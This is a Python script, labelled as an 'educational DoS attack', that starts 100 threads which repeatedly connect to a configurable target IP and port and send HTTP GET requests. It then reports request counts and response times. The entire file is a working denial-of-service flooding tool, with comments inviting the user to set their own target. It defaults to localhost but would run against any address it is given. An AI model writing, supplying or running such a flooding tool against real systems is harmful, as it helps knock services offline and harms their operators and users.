import logging
import socket
import threading
import time
import statistics
import sys

# Configure colored logging
try:
    import colorlog
    
    handler = colorlog.StreamHandler()
    handler.setFormatter(colorlog.ColoredFormatter(
        '%(log_color)s%(asctime)s - %(message)s',
        log_colors={
            'INFO': 'green',
            'WARNING': 'yellow',
            'ERROR': 'red',
            'CRITICAL': 'red,bg_white',
        }
    ))
    
    logger = colorlog.getLogger()
    logger.setLevel(logging.INFO)
    logger.handlers = [handler]
except ImportError:
    # Fallback to standard logging if colorlog is not installed
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(message)s',
        datefmt='%H:%M:%S'
    )
    logger = logging.getLogger()
    print("For colored logs, install colorlog: pip install colorlog")

TARGET_IP = "127.0.0.1"  # Change this to your target IP
TARGET_PORT = 8000        # Change this to your target port

# Statistics tracking
request_count = 0
response_times = []
summary_interval = 10  # Show summary every N requests
lock = threading.Lock()  # Lock for thread-safe operations on shared variables

def attack():
    global request_count
    global response_times
    
    while True:
        try:
            start_time = time.time()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
            s.close()
            end_time = time.time()
            response_time = end_time - start_time
            
            with lock:
                request_count += 1
                response_times.append(response_time)
                
                # Only log detailed info at intervals to reduce spam
                if request_count % summary_interval == 0:
                    avg_time = statistics.mean(response_times[-summary_interval:])
                    max_time = max(response_times[-summary_interval:])
                    
                    logger.info(f"Request #{request_count} | Response Time: {response_time:.4f}s | "
                                f"Avg: {avg_time:.4f}s | Max: {max_time:.4f}s")
                    
                    # Clear old response times to prevent memory buildup during long runs
                    if len(response_times) > 1000:
                        response_times = response_times[-100:]

            time.sleep(0.01)  # Small delay to prevent overwhelming the system

        except Exception as e:
            logger.error(f"Connection failed: {e}")
            time.sleep(0.5)  # Back off on errors

def main():
    print(f"Starting educational DoS attack against {TARGET_IP}:{TARGET_PORT}")
    print("Press Ctrl+C to stop the attack\n")

    # Launch multiple threads
    NUM_THREADS = 100  # Adjust as needed
    threads = []

    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=attack)
        thread.daemon = True  # Set as daemon so they will exit when the main thread exits
        thread.start()
        threads.append(thread)

    try:
        # Keep the main thread alive but responsive to keyboard interrupts
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        # Calculate final statistics
        with lock:
            avg_time = statistics.mean(response_times) if response_times else 0
            max_time = max(response_times) if response_times else 0
        
        print("\n" + "="*50)
        print(f"Attack Summary:")
        print(f"Total Requests: {request_count}")
        print(f"Average Response Time: {avg_time:.4f}s")
        print(f"Maximum Response Time: {max_time:.4f}s")
        print("="*50)
        sys.exit(0)

if __name__ == "__main__":
    main()
